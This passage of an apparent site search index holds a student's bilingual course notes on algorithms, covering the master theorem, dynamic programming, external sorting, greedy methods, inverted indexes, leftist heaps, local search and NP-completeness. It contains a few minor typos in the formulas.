Kf(N)\\) for some constant \\(K>1\\) , then \\(T(N)=\\Theta(N^{log_{b}{a}})\\) If \\(af(N/b) = f(N)\\) , then \\(T(N)=\\Theta(f(N)log_b{N})\\) Form2 The recurrence \\(T(N)=aT(N/b) + \\Theta(N^k\\log^p{N})\\) where \\(a\\ge 1, b> 1, p\\ge 0\\) \uff1a \\(T(N)=O(N^{\\log_b{a}})\\) , if \\(a>b^k\\) \\(T(N)=O(N^k\\log^{p+1}{N})\\) , if \\(a=b^k\\) \\(T(N)=O(N^k\\log^{p}{N})\\) , if \\(a<b^k\\) Form3 The recurrence \\(T(N)=aT(N/b)+f(N)\\) If \\(f(N)=O(N^{\\log_b^{a-\\epsilon}})\\) for some constant \\(\\epsilon>0\\) , then \\(T(N)=\\Theta(N^{\\log_b{a}})\\) If \\(f(N)=\\Theta(N^{\\log_b{a}})\\) , then \\(T(N)=\\Theta(N^{\\log_b{a}}\\log{N})\\) If \\(f(N)=\\Omega(N^{\\log_{b}{a+\\epsilon}})\\) , for some constant \\(\\epsilon>0\\) , and if \\(af(N/b)<cf(N)\\) for some constant \\(c<1\\) and all sufficiently large \\(N\\) , then \\(T(N)=\\Theta(f(N))\\) Special case \u6c42\u89e3\uff1a \\(T(N)=2T(\\sqrt{N})+\\log{N}\\) \\[ \\begin{aligned} &let\\ N = 2^m\\\\ &thus\\ T(N)=2T(\\sqrt{N})+\\log{N}\\to T(2^m)=T(2^{\\frac{m}{2}})+m\\\\ &let\\ G(m)=T(2^m)\\\\ &thus\\ G(m)=G(m/2)+m \\to G(m)=m\\log{m}=\\log{n}\\log\\log{n} \\end{aligned} \\]","title":"Divide and Conquer"},{"location":"course/ads/divide/#divide-and-conquer","text":"","title":"Divide and Conquer"},{"location":"course/ads/divide/#recursive-tree","text":"","title":"Recursive tree"},{"location":"course/ads/divide/#master-theory","text":"","title":"Master Theory"},{"location":"course/ads/divide/#form1","text":"The recurrence \\(T(N) = aT(N/b) + f(N)\\) can be solved as follows: If \\(af(N/b) = Kf(N)\\) for some constant \\(K<1\\) , then \\(T(N)=\\Theta(f(N))\\) If \\(af(N/b) = Kf(N)\\) for some constant \\(K>1\\) , then \\(T(N)=\\Theta(N^{log_{b}{a}})\\) If \\(af(N/b) = f(N)\\) , then \\(T(N)=\\Theta(f(N)log_b{N})\\)","title":"Form1"},{"location":"course/ads/divide/#form2","text":"The recurrence \\(T(N)=aT(N/b) + \\Theta(N^k\\log^p{N})\\) where \\(a\\ge 1, b> 1, p\\ge 0\\) \uff1a \\(T(N)=O(N^{\\log_b{a}})\\) , if \\(a>b^k\\) \\(T(N)=O(N^k\\log^{p+1}{N})\\) , if \\(a=b^k\\) \\(T(N)=O(N^k\\log^{p}{N})\\) , if \\(a<b^k\\)","title":"Form2"},{"location":"course/ads/divide/#form3","text":"The recurrence \\(T(N)=aT(N/b)+f(N)\\) If \\(f(N)=O(N^{\\log_b^{a-\\epsilon}})\\) for some constant \\(\\epsilon>0\\) , then \\(T(N)=\\Theta(N^{\\log_b{a}})\\) If \\(f(N)=\\Theta(N^{\\log_b{a}})\\) , then \\(T(N)=\\Theta(N^{\\log_b{a}}\\log{N})\\) If \\(f(N)=\\Omega(N^{\\log_{b}{a+\\epsilon}})\\) , for some constant \\(\\epsilon>0\\) , and if \\(af(N/b)<cf(N)\\) for some constant \\(c<1\\) and all sufficiently large \\(N\\) , then \\(T(N)=\\Theta(f(N))\\)","title":"Form3"},{"location":"course/ads/divide/#special-case","text":"\u6c42\u89e3\uff1a \\(T(N)=2T(\\sqrt{N})+\\log{N}\\) \\[ \\begin{aligned} &let\\ N = 2^m\\\\ &thus\\ T(N)=2T(\\sqrt{N})+\\log{N}\\to T(2^m)=T(2^{\\frac{m}{2}})+m\\\\ &let\\ G(m)=T(2^m)\\\\ &thus\\ G(m)=G(m/2)+m \\to G(m)=m\\log{m}=\\log{n}\\log\\log{n} \\end{aligned} \\]","title":"Special case"},{"location":"course/ads/dp/","text":"Dynamic Program \u52a8\u6001\u89c4\u5212\uff08\u7b80\u79f0dp\uff09\uff0c\u662f\u975e\u5e38\u91cd\u8981\u548c\u5e38\u89c1\u7684\u7b97\u6cd5\u601d\u60f3\uff0c\u57fa\u672c\u60f3\u6cd5\u4e5f\u662f\u628a\u5927\u95ee\u9898 \u8f6c\u5316\u4e3a\u8f83\u5c0f\u7684\u5b50\u95ee\u9898\uff0c\u4f46\u4e0e\u5206\u6cbb\u601d\u60f3\u4e0d\u540c\u7684\u662f\uff0c\u5206\u6cbb\u662f\u5c06\u5927\u95ee\u9898\u8f6c\u5316\u4e3a\u82e5\u5e72\u4e2a\u4e0d\u76f8 \u5173\u8054\u7684\u5c0f\u95ee\u9898\uff0c\u5173\u952e\u5728\u4e8e\u5982\u4f55\u5408\u5e76\u3002\u800cdp\u5219\u662f\u5c1d\u8bd5\u4ece\u5c0f\u95ee\u9898\u5f00\u59cb\uff0c\u9010\u6b65\u751f\u6210\u6700\u7ec8\u7684 \u5927\u95ee\u9898\uff0c\u5173\u952e\u5728\u4e8e\u5982\u4f55\u63a8\u8fdb\u751f\u6210\u3002\u6ce8\u610f\u4e5f\u8981\u8bb2dp \u533a\u522b\u4e8e\u9012\u5f52\uff0c\u9012\u5f52\u662f\u5148\u4ece\u9876\u5c42\u8003 \u8651\uff0c\u4e00\u8def\u5411\u4e0b\uff0c\u9047\u5230\u57fa\u672c\u60c5\u51b5\u540e\u518d\u56de\u6eaf\uff0c\u800cdp\u5219\u662f\u5148\u201c\u642d\u5730\u57fa\u201d\uff0c\u628a\u57fa\u672c\u60c5\u51b5\u5168\u90e8 \u89e3\u51fa\uff0c\u9010\u6b65\u5411\u4e0a\u6700\u7ec8\u5f97\u5230\u7ed3\u679c\uff0c\u76f8\u6bd4\u4e8e\u9012\u5f52\uff0cdp\u5f80\u5f80\u80fd\u51cf\u5c11\u91cd\u590d\u8ba1\u7b97\uff0c\u8fd9\u662f\u56e0\u4e3a\u4ece \u7b97\u6cd5\u7684\u5f62\u5f0f\u6765\u8bb2\uff0cdp\u7684\u5f62\u5f0f\u5f80\u5f80\u662f\u8fed\u4ee3\u3002","title":"Dynamic Program"},{"location":"course/ads/dp/#dynamic-program","text":"\u52a8\u6001\u89c4\u5212\uff08\u7b80\u79f0dp\uff09\uff0c\u662f\u975e\u5e38\u91cd\u8981\u548c\u5e38\u89c1\u7684\u7b97\u6cd5\u601d\u60f3\uff0c\u57fa\u672c\u60f3\u6cd5\u4e5f\u662f\u628a\u5927\u95ee\u9898 \u8f6c\u5316\u4e3a\u8f83\u5c0f\u7684\u5b50\u95ee\u9898\uff0c\u4f46\u4e0e\u5206\u6cbb\u601d\u60f3\u4e0d\u540c\u7684\u662f\uff0c\u5206\u6cbb\u662f\u5c06\u5927\u95ee\u9898\u8f6c\u5316\u4e3a\u82e5\u5e72\u4e2a\u4e0d\u76f8 \u5173\u8054\u7684\u5c0f\u95ee\u9898\uff0c\u5173\u952e\u5728\u4e8e\u5982\u4f55\u5408\u5e76\u3002\u800cdp\u5219\u662f\u5c1d\u8bd5\u4ece\u5c0f\u95ee\u9898\u5f00\u59cb\uff0c\u9010\u6b65\u751f\u6210\u6700\u7ec8\u7684 \u5927\u95ee\u9898\uff0c\u5173\u952e\u5728\u4e8e\u5982\u4f55\u63a8\u8fdb\u751f\u6210\u3002\u6ce8\u610f\u4e5f\u8981\u8bb2dp \u533a\u522b\u4e8e\u9012\u5f52\uff0c\u9012\u5f52\u662f\u5148\u4ece\u9876\u5c42\u8003 \u8651\uff0c\u4e00\u8def\u5411\u4e0b\uff0c\u9047\u5230\u57fa\u672c\u60c5\u51b5\u540e\u518d\u56de\u6eaf\uff0c\u800cdp\u5219\u662f\u5148\u201c\u642d\u5730\u57fa\u201d\uff0c\u628a\u57fa\u672c\u60c5\u51b5\u5168\u90e8 \u89e3\u51fa\uff0c\u9010\u6b65\u5411\u4e0a\u6700\u7ec8\u5f97\u5230\u7ed3\u679c\uff0c\u76f8\u6bd4\u4e8e\u9012\u5f52\uff0cdp\u5f80\u5f80\u80fd\u51cf\u5c11\u91cd\u590d\u8ba1\u7b97\uff0c\u8fd9\u662f\u56e0\u4e3a\u4ece \u7b97\u6cd5\u7684\u5f62\u5f0f\u6765\u8bb2\uff0cdp\u7684\u5f62\u5f0f\u5f80\u5f80\u662f\u8fed\u4ee3\u3002","title":"Dynamic Program"},{"location":"course/ads/external/","text":"External Sorting Tip \u5728 Database Query Process \u4e2d\u63d0\u5230\u8fc7External Sort\u3002 What are the concerns Seek time: O(number of passes) Block transfers: Time to read or write one block of records Time to internally sort M records Time to merge N records from input buffers to the output buffer How to reduce the number of passes? \u4f7f\u7528 k-way merge\uff0cpasses = \\(1+\\lceil \\log_k(N/M)\\rceil\\) \uff0c\u4f46\u662f\u9700\u89812k\u7684tapes \u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6590\u6ce2\u90a3\u5951\u5f0f\u7684\u5408\u5e76\u65b9\u6cd5\uff0c\u53ea\u9700\u8981k+1\u4e2atapes How to Handle the Buffers for parallel operation? \u5bf9buffer\u7684\u8bfb\u53d6/\u5199\u56de\u8fdb\u884c\u4f18\u5316 \u5bf9\u4e8e\u4e00\u4e2aK\u8def\u5f52\u5e76\uff0c\u9700\u89812k\u4e2a\u8f93\u5165buffer\u548c2\u4e2a\u8f93\u51fabuffer\u6765\u8fdb\u884c\u5e76\u884c\u64cd\u4f5c \u4e3a\u4ec0\u4e48\u4e0d\u662fk\u548c1\uff1f\u7b54\uff1a\u56e0\u4e3a\u662f\u4e00\u4e2a\u6b63\u5f0f\u4e00\u4e2a\u7f13\u51b2 \u4e8b\u5b9e\u4e0aK\u4e0d\u662f\u8d8a\u5927\u8d8a\u597d\uff0c\u56e0\u4e3a\u5982\u679cK\u589e\u5927\uff0c\u5c31\u4f1a\u5bfc\u81f4input buffer\u7684\u6570\u91cf\u9700\u6c42\u589e\u52a0\uff0c\u5bfc\u81f4buffer size\u51cf\u5c11\uff0c\u5bfc\u81f4\u78c1\u76d8\u4e2d\u4e00\u4e2ablock\u7684size\u51cf\u5c11\uff0c\u5bfc\u81f4\u8bbf\u95ee\u78c1\u76d8\u7684seek time\u589e\u52a0\uff0c\u56e0\u6b64\u6700\u4f18\u7684K\u503c\u53d6\u51b3\u4e8e\u78c1\u76d8\u7684\u53c2\u6570\u548c\u5916\u90e8memory\u7684\u89c4\u6a21 How to generate a longer run? \u4f7f\u7528\u5806\u7684\u7ed3\u6784\u6765\u8fdb\u884c\u6392\u5e8f\u64cd\u4f5c\uff0c\u89c4\u5219\u662f\u4e00\u76f4\u53d6\u51fa\u5806\u4e2d\u73b0\u5b58\u7684\u53ef\u4ee5\u653e\u5728\u73b0\u5728\u6240\u5728\u7684run\u540e\u9762\u7684\u6700\u5c0f\u7684\u6570\uff0c\u76f4\u5230\u5806\u4e2d\u7684\u6570\u636e\u90fd\u653e\u4e0d\u8fdb\u5f53\u524drun\u4e86\u518d\u66f4\u6362\u4e00\u4e2arun \u5982\u679c\u5185\u5b58\u53ef\u4ee5\u5bb9\u7eb3M\u4e2a\u5143\u7d20\uff0c\u5219\u8fd9\u79cd\u65b9\u6cd5\u751f\u6210\u7684run\u7684\u5e73\u5747\u957f\u5ea6\u4e3a2M \u5728\u8f93\u5165\u7684\u5143\u7d20 \u63a5\u8fd1\u5df2\u7ecf\u6392\u597d\u5e8f \u7684\u72b6\u6001\u65f6\u975e\u5e38\u6709\u6548 How to minimize the merge time? \u4f7f\u7528Huffman\u6811","title":"External Sorting"},{"location":"course/ads/external/#external-sorting","text":"Tip \u5728 Database Query Process \u4e2d\u63d0\u5230\u8fc7External Sort\u3002","title":"External Sorting"},{"location":"course/ads/external/#what-are-the-concerns","text":"Seek time: O(number of passes) Block transfers: Time to read or write one block of records Time to internally sort M records Time to merge N records from input buffers to the output buffer","title":"What are the concerns"},{"location":"course/ads/external/#how-to-reduce-the-number-of-passes","text":"\u4f7f\u7528 k-way merge\uff0cpasses = \\(1+\\lceil \\log_k(N/M)\\rceil\\) \uff0c\u4f46\u662f\u9700\u89812k\u7684tapes \u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6590\u6ce2\u90a3\u5951\u5f0f\u7684\u5408\u5e76\u65b9\u6cd5\uff0c\u53ea\u9700\u8981k+1\u4e2atapes","title":"How to reduce the number of passes?"},{"location":"course/ads/external/#how-to-handle-the-buffers-for-parallel-operation","text":"\u5bf9buffer\u7684\u8bfb\u53d6/\u5199\u56de\u8fdb\u884c\u4f18\u5316 \u5bf9\u4e8e\u4e00\u4e2aK\u8def\u5f52\u5e76\uff0c\u9700\u89812k\u4e2a\u8f93\u5165buffer\u548c2\u4e2a\u8f93\u51fabuffer\u6765\u8fdb\u884c\u5e76\u884c\u64cd\u4f5c \u4e3a\u4ec0\u4e48\u4e0d\u662fk\u548c1\uff1f\u7b54\uff1a\u56e0\u4e3a\u662f\u4e00\u4e2a\u6b63\u5f0f\u4e00\u4e2a\u7f13\u51b2 \u4e8b\u5b9e\u4e0aK\u4e0d\u662f\u8d8a\u5927\u8d8a\u597d\uff0c\u56e0\u4e3a\u5982\u679cK\u589e\u5927\uff0c\u5c31\u4f1a\u5bfc\u81f4input buffer\u7684\u6570\u91cf\u9700\u6c42\u589e\u52a0\uff0c\u5bfc\u81f4buffer size\u51cf\u5c11\uff0c\u5bfc\u81f4\u78c1\u76d8\u4e2d\u4e00\u4e2ablock\u7684size\u51cf\u5c11\uff0c\u5bfc\u81f4\u8bbf\u95ee\u78c1\u76d8\u7684seek time\u589e\u52a0\uff0c\u56e0\u6b64\u6700\u4f18\u7684K\u503c\u53d6\u51b3\u4e8e\u78c1\u76d8\u7684\u53c2\u6570\u548c\u5916\u90e8memory\u7684\u89c4\u6a21","title":"How to Handle the Buffers for parallel operation?"},{"location":"course/ads/external/#how-to-generate-a-longer-run","text":"\u4f7f\u7528\u5806\u7684\u7ed3\u6784\u6765\u8fdb\u884c\u6392\u5e8f\u64cd\u4f5c\uff0c\u89c4\u5219\u662f\u4e00\u76f4\u53d6\u51fa\u5806\u4e2d\u73b0\u5b58\u7684\u53ef\u4ee5\u653e\u5728\u73b0\u5728\u6240\u5728\u7684run\u540e\u9762\u7684\u6700\u5c0f\u7684\u6570\uff0c\u76f4\u5230\u5806\u4e2d\u7684\u6570\u636e\u90fd\u653e\u4e0d\u8fdb\u5f53\u524drun\u4e86\u518d\u66f4\u6362\u4e00\u4e2arun \u5982\u679c\u5185\u5b58\u53ef\u4ee5\u5bb9\u7eb3M\u4e2a\u5143\u7d20\uff0c\u5219\u8fd9\u79cd\u65b9\u6cd5\u751f\u6210\u7684run\u7684\u5e73\u5747\u957f\u5ea6\u4e3a2M \u5728\u8f93\u5165\u7684\u5143\u7d20 \u63a5\u8fd1\u5df2\u7ecf\u6392\u597d\u5e8f \u7684\u72b6\u6001\u65f6\u975e\u5e38\u6709\u6548","title":"How to generate a longer run?"},{"location":"course/ads/external/#how-to-minimize-the-merge-time","text":"\u4f7f\u7528Huffman\u6811","title":"How to minimize the merge time?"},{"location":"course/ads/greedy/","text":"Greedy Activity Selection Problem \u9898\u76ee\u63cf\u8ff0 \u7ed9\u5b9an\u6761\u7ebf\u6bb5\uff0c\u9009\u53d6\u6700\u5927\u7684\u96c6\u5408\uff0c\u4f7f\u5f97\u96c6\u5408\u4e2d\u7684\u7ebf\u6bb5\u4e24\u4e24\u4e0d\u76f8\u4ea4\u3002 Solution \u9009\u53d6\u6700\u5148\u7ed3\u675f\u7684\u7ebf\u6bb5 Huffman's Algorithm definition Every time pop two minist nodes from the heap, and add them to the tree with the new merging node push into the heap, until the heap is empty. example","title":"Greedy"},{"location":"course/ads/greedy/#greedy","text":"","title":"Greedy"},{"location":"course/ads/greedy/#activity-selection-problem","text":"","title":"Activity Selection Problem"},{"location":"course/ads/greedy/#_1","text":"\u7ed9\u5b9an\u6761\u7ebf\u6bb5\uff0c\u9009\u53d6\u6700\u5927\u7684\u96c6\u5408\uff0c\u4f7f\u5f97\u96c6\u5408\u4e2d\u7684\u7ebf\u6bb5\u4e24\u4e24\u4e0d\u76f8\u4ea4\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"course/ads/greedy/#solution","text":"\u9009\u53d6\u6700\u5148\u7ed3\u675f\u7684\u7ebf\u6bb5","title":"Solution"},{"location":"course/ads/greedy/#huffmans-algorithm","text":"","title":"Huffman's Algorithm"},{"location":"course/ads/greedy/#definition","text":"Every time pop two minist nodes from the heap, and add them to the tree with the new merging node push into the heap, until the heap is empty.","title":"definition"},{"location":"course/ads/greedy/#example","text":"","title":"example"},{"location":"course/ads/inverse/","text":"Inverted File Index Definition Index is a mechanism for locating a given term in a text. Inverted file contains a list of pointers, Inverted because it lists for a term Modules Token analyzer + stop filter Word Stemming Stop Words index search tree hash table distributed index Dynamic indexing Docs come in / deleted Thresholding only retrieve the top x documents Measures How fast does it index How fast does it search Expressiveness of query language Data retrieval performance index space response time Relevance measurement requires 3 elements A benchmark document collection A benchmark suite of queries A binary assessment of either relevent or irrelevant for each query-doc pair relevant Irrelevant Retrived \\(R_R\\) \\(I_R\\) Not Retrived \\(R_N\\) \\(I_N\\) Precision \\(P =R_R/(R_R+I_R)\\) Recall \\(R = R_R/(R_R+R_N)\\)","title":"Inverted File Index"},{"location":"course/ads/inverse/#inverted-file-index","text":"","title":"Inverted File Index"},{"location":"course/ads/inverse/#definition","text":"Index is a mechanism for locating a given term in a text. Inverted file contains a list of pointers, Inverted because it lists for a term","title":"Definition"},{"location":"course/ads/inverse/#modules","text":"Token analyzer + stop filter Word Stemming Stop Words index search tree hash table distributed index Dynamic indexing Docs come in / deleted Thresholding only retrieve the top x documents","title":"Modules"},{"location":"course/ads/inverse/#measures","text":"How fast does it index How fast does it search Expressiveness of query language","title":"Measures"},{"location":"course/ads/inverse/#data-retrieval-performance","text":"index space response time","title":"Data retrieval performance"},{"location":"course/ads/inverse/#relevance-measurement-requires-3-elements","text":"A benchmark document collection A benchmark suite of queries A binary assessment of either relevent or irrelevant for each query-doc pair relevant Irrelevant Retrived \\(R_R\\) \\(I_R\\) Not Retrived \\(R_N\\) \\(I_N\\) Precision \\(P =R_R/(R_R+I_R)\\) Recall \\(R = R_R/(R_R+R_N)\\)","title":"Relevance measurement requires 3 elements"},{"location":"course/ads/left/","text":"Leftist Heaps Definition of NPL The null path length, Npl(X), of any node X is the length of the shortest path from X to a node without two children. Define Npl(NULL) = -1. \\(Npl(X)=\\min\\{Npl(C)+1, \\rm for\\ all\\ C\\ as\\ children\\ of\\ X\\}\\) Definition of leftist heap The leftist heap property is that for every node X in the heap, the null path length of the left child is at least as large as that of the right child. Theorem A leftlist tree with \\(r\\) nodes on the right path must have at least \\(2^{r} - 1\\) nodes. Insertion(merge) Merge(H1->Right, H2) Attach(H2, H1->Right) Swap(H1->Right, H1->Left) if necessary DeleteMin Delete the root Merge the two subtrees Time Complexity \\(T_p=O(\\log{N})\\)","title":"Leftist Heaps"},{"location":"course/ads/left/#leftist-heaps","text":"","title":"Leftist Heaps"},{"location":"course/ads/left/#definition-of-npl","text":"The null path length, Npl(X), of any node X is the length of the shortest path from X to a node without two children. Define Npl(NULL) = -1. \\(Npl(X)=\\min\\{Npl(C)+1, \\rm for\\ all\\ C\\ as\\ children\\ of\\ X\\}\\)","title":"Definition of NPL"},{"location":"course/ads/left/#definition-of-leftist-heap","text":"The leftist heap property is that for every node X in the heap, the null path length of the left child is at least as large as that of the right child.","title":"Definition of leftist heap"},{"location":"course/ads/left/#theorem","text":"A leftlist tree with \\(r\\) nodes on the right path must have at least \\(2^{r} - 1\\) nodes.","title":"Theorem"},{"location":"course/ads/left/#insertionmerge","text":"Merge(H1->Right, H2) Attach(H2, H1->Right) Swap(H1->Right, H1->Left) if necessary","title":"Insertion(merge)"},{"location":"course/ads/left/#deletemin","text":"Delete the root Merge the two subtrees","title":"DeleteMin"},{"location":"course/ads/left/#time-complexity","text":"\\(T_p=O(\\log{N})\\)","title":"Time Complexity"},{"location":"course/ads/local/","text":"Local Search Local search solves problems approximately, aiming at a local optimum \\(S\\sim S'\\) : \\(S'\\) is a neighboring solution of S-S' can be obtained by a small modification of S \\(N(S)\\) : neighborhood of S Vertex Cover \u95ee\u9898\u63cf\u8ff0: \u5728\u65e0\u5411\u56feG\u4e2d\u627e\u51fa\u6700\u5c0f\u7684\u70b9\u96c6S\uff0c\u5bf9\u4e8eG\u7684\u6bcf\u4e00\u6761\u8fb9\uff0c\u81f3\u5c11\u6709\u4e00\u4e2a\u9876\u70b9\u5728S\u4e2d \u57fa\u7840\u7b97\u6cd5 \u521d\u59cb\u9ed8\u8ba4\u9009\u53d6\u6240\u6709\u70b9\uff0c\u63a5\u4e0b\u6765\u6bcf\u6b21\u5220\u53bb\u4e00\u4e2a\u70b9\uff0c\u76f4\u81f3\u4e0d\u80fd\u5220\u53bb\u3002 Metropolis Algorithm \u521d\u59cb\u9ed8\u8ba4\u9009\u53d6\u6240\u6709\u70b9\uff0c\u63a5\u4e0b\u6765\u6bcf\u6b21\u5220\u53bb/\u589e\u52a0\u4e00\u4e2a\u70b9\u3002 \u82e5\u662f\u589e\u52a0\u4e00\u4e2a\u70b9\uff0c\u53ea\u6709 \\(e^{-\\Delta cost/(kT)}\\) \u7684\u6982\u7387\u53ef\u4ee5\u901a\u8fc7\u3002 Hopfield Neural Networks \u95ee\u9898\u63cf\u8ff0\uff1a\u7ed9\u5b9a\u5e26\u6743\u8fb9 \\(w\\) \u7684\u65e0\u5411\u56feG\uff0c\u8981\u6c42\u5bf9\u8282\u70b9\u8d4b\u503c \\(s\\) (\u6b63/\u8d1f)\uff0c\u5e76\u6ee1\u8db3\u4e0b\u8ff0\u8981\u6c42 \u5b9a\u4e49\u597d\u8fb9\u548c\u574f\u8fb9(\u597d\u8fb9\u5c31\u662f\u6ee1\u8db3\u6761\u4ef6\u7684\u8fb9)\uff1a \\(w_es_us_v<0\\) \u5bf9\u4e8e\u4e00\u4e2a\u9876\u70b9\uff0c\u5982\u679c\u5176 \\(\\sum w_es_us_v<0\\) \u5219\u79f0\u4e4b\u4e3a\u6ee1\u8db3\u7684\uff0c\u5982\u679c\u6240\u6709\u70b9\u90fd\u662f\u6ee1\u8db3\u7684\uff0c\u90a3\u4e48\u8fd9\u4e2a\u56fe\u5c31\u662f\u7a33\u5b9a\u7684 \u7b97\u6cd5 \u6bcf\u6b21\u9009\u53d6\u4e00\u4e2a\u70b9u\uff0c\u5176 \\(\\sum w_es_us_v > 0\\) \uff0c\u5e76\u6539\u53d8\u8be5\u70b9\u8d4b\u503c\uff0c\u76f4\u81f3\u6240\u6709\u70b9\u5747\u6ee1\u8db3 \u7b97\u6cd5\u590d\u6742\u5ea6\u4e3a \\(O(W)\\) \uff0c \\(W=\\sum |w_e|\\) \u3002\u56e0\u4e3a\u6bcf\u6b21\u7ffb\u8f6c\u70b9\uff0c\u597d\u8fb9\u7684\u548c\u81f3\u5c11\u589e\u52a01\uff0c\u6700\u591a\u589e\u52a0 \\(W\\) \u6b21\u3002 Maximum Cut Problems \u95ee\u9898\u63cf\u8ff0\uff1a\u7ed9\u5b9a\u4e00\u4e2a\u56fe\uff0c\u627e\u5230\u4e00\u79cd\u5c06\u5176\u70b9\u5206\u6210\u4e24\u4e2a\u96c6\u5408A\u3001B\u7684\u65b9\u6cd5\uff0c\u4f7f\u5f97\u4e24\u7aef\u5206\u522b\u5728A\u3001B\u4e2d\u70b9\u8fb9\u7684\u6743\u91cd\u548c\u6700\u5927\u3002 \u5b9a\u7406\uff1a\u5c40\u90e8\u6700\u4f18\u89e3\u7684\u6743\u91cd\u548c\u4e0d\u4f1a\u4f4e\u4e8e\u5168\u5c40\u6700\u4f18\u89e3\u7684\u4e00\u534a \\(w(A,B)\\ge \\frac{1}{2}w(A*,B*)\\) big-improvement-flip \u7b97\u6cd5 \u5f53\u65b0\u7684\u5c40\u90e8\u6700\u4f18\u89e3\u7684\u589e\u957f\u7684\u5e45\u5ea6\u5c0f\u4e8e \\(\\frac{2\\epsilon}{|v|}w(A,B)\\) \u7684\u65f6\u5019\u5c31\u505c\u6b62\uff0c\u4e3a\u4e86\u8ba9\u7b97\u6cd5\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u7ed3\u675f \u8fd9\u6837\u6709 \\((2+\\epsilon)w(A,B)\\ge w(A*,B*)\\) \u590d\u6742\u5ea6\u4e3a \\(O(n/\\epsilon \\log W)\\)","title":"Local Search"},{"location":"course/ads/local/#local-search","text":"Local search solves problems approximately, aiming at a local optimum \\(S\\sim S'\\) : \\(S'\\) is a neighboring solution of S-S' can be obtained by a small modification of S \\(N(S)\\) : neighborhood of S","title":"Local Search"},{"location":"course/ads/local/#vertex-cover","text":"\u95ee\u9898\u63cf\u8ff0: \u5728\u65e0\u5411\u56feG\u4e2d\u627e\u51fa\u6700\u5c0f\u7684\u70b9\u96c6S\uff0c\u5bf9\u4e8eG\u7684\u6bcf\u4e00\u6761\u8fb9\uff0c\u81f3\u5c11\u6709\u4e00\u4e2a\u9876\u70b9\u5728S\u4e2d \u57fa\u7840\u7b97\u6cd5 \u521d\u59cb\u9ed8\u8ba4\u9009\u53d6\u6240\u6709\u70b9\uff0c\u63a5\u4e0b\u6765\u6bcf\u6b21\u5220\u53bb\u4e00\u4e2a\u70b9\uff0c\u76f4\u81f3\u4e0d\u80fd\u5220\u53bb\u3002 Metropolis Algorithm \u521d\u59cb\u9ed8\u8ba4\u9009\u53d6\u6240\u6709\u70b9\uff0c\u63a5\u4e0b\u6765\u6bcf\u6b21\u5220\u53bb/\u589e\u52a0\u4e00\u4e2a\u70b9\u3002 \u82e5\u662f\u589e\u52a0\u4e00\u4e2a\u70b9\uff0c\u53ea\u6709 \\(e^{-\\Delta cost/(kT)}\\) \u7684\u6982\u7387\u53ef\u4ee5\u901a\u8fc7\u3002","title":"Vertex Cover"},{"location":"course/ads/local/#hopfield-neural-networks","text":"\u95ee\u9898\u63cf\u8ff0\uff1a\u7ed9\u5b9a\u5e26\u6743\u8fb9 \\(w\\) \u7684\u65e0\u5411\u56feG\uff0c\u8981\u6c42\u5bf9\u8282\u70b9\u8d4b\u503c \\(s\\) (\u6b63/\u8d1f)\uff0c\u5e76\u6ee1\u8db3\u4e0b\u8ff0\u8981\u6c42 \u5b9a\u4e49\u597d\u8fb9\u548c\u574f\u8fb9(\u597d\u8fb9\u5c31\u662f\u6ee1\u8db3\u6761\u4ef6\u7684\u8fb9)\uff1a \\(w_es_us_v<0\\) \u5bf9\u4e8e\u4e00\u4e2a\u9876\u70b9\uff0c\u5982\u679c\u5176 \\(\\sum w_es_us_v<0\\) \u5219\u79f0\u4e4b\u4e3a\u6ee1\u8db3\u7684\uff0c\u5982\u679c\u6240\u6709\u70b9\u90fd\u662f\u6ee1\u8db3\u7684\uff0c\u90a3\u4e48\u8fd9\u4e2a\u56fe\u5c31\u662f\u7a33\u5b9a\u7684 \u7b97\u6cd5 \u6bcf\u6b21\u9009\u53d6\u4e00\u4e2a\u70b9u\uff0c\u5176 \\(\\sum w_es_us_v > 0\\) \uff0c\u5e76\u6539\u53d8\u8be5\u70b9\u8d4b\u503c\uff0c\u76f4\u81f3\u6240\u6709\u70b9\u5747\u6ee1\u8db3 \u7b97\u6cd5\u590d\u6742\u5ea6\u4e3a \\(O(W)\\) \uff0c \\(W=\\sum |w_e|\\) \u3002\u56e0\u4e3a\u6bcf\u6b21\u7ffb\u8f6c\u70b9\uff0c\u597d\u8fb9\u7684\u548c\u81f3\u5c11\u589e\u52a01\uff0c\u6700\u591a\u589e\u52a0 \\(W\\) \u6b21\u3002","title":"Hopfield Neural Networks"},{"location":"course/ads/local/#maximum-cut-problems","text":"\u95ee\u9898\u63cf\u8ff0\uff1a\u7ed9\u5b9a\u4e00\u4e2a\u56fe\uff0c\u627e\u5230\u4e00\u79cd\u5c06\u5176\u70b9\u5206\u6210\u4e24\u4e2a\u96c6\u5408A\u3001B\u7684\u65b9\u6cd5\uff0c\u4f7f\u5f97\u4e24\u7aef\u5206\u522b\u5728A\u3001B\u4e2d\u70b9\u8fb9\u7684\u6743\u91cd\u548c\u6700\u5927\u3002 \u5b9a\u7406\uff1a\u5c40\u90e8\u6700\u4f18\u89e3\u7684\u6743\u91cd\u548c\u4e0d\u4f1a\u4f4e\u4e8e\u5168\u5c40\u6700\u4f18\u89e3\u7684\u4e00\u534a \\(w(A,B)\\ge \\frac{1}{2}w(A*,B*)\\) big-improvement-flip \u7b97\u6cd5 \u5f53\u65b0\u7684\u5c40\u90e8\u6700\u4f18\u89e3\u7684\u589e\u957f\u7684\u5e45\u5ea6\u5c0f\u4e8e \\(\\frac{2\\epsilon}{|v|}w(A,B)\\) \u7684\u65f6\u5019\u5c31\u505c\u6b62\uff0c\u4e3a\u4e86\u8ba9\u7b97\u6cd5\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u7ed3\u675f \u8fd9\u6837\u6709 \\((2+\\epsilon)w(A,B)\\ge w(A*,B*)\\) \u590d\u6742\u5ea6\u4e3a \\(O(n/\\epsilon \\log W)\\)","title":"Maximum Cut Problems"},{"location":"course/ads/np/","text":"NP Completeness Decision problem (yes/no) Search problem (find the answer) Optimization problem Nondeterministic Turing machine A Deterministic Turing Machine executes one instruction at each point in time. And then depending on the instruction, it goes to the next unique instruction. A Nondeterminism is now typically represented by giving a machine an extra input, the certificate or witness. NP NP: Nondeterministic polynomial-time NP Problem: \u5728 polynomial-time \u65f6\u95f4\u5185\u53ef\u4ee5\u9a8c\u8bc1\u7684\u95ee\u9898\u3002 \\(NP \\overset{?}{=} P\\) : 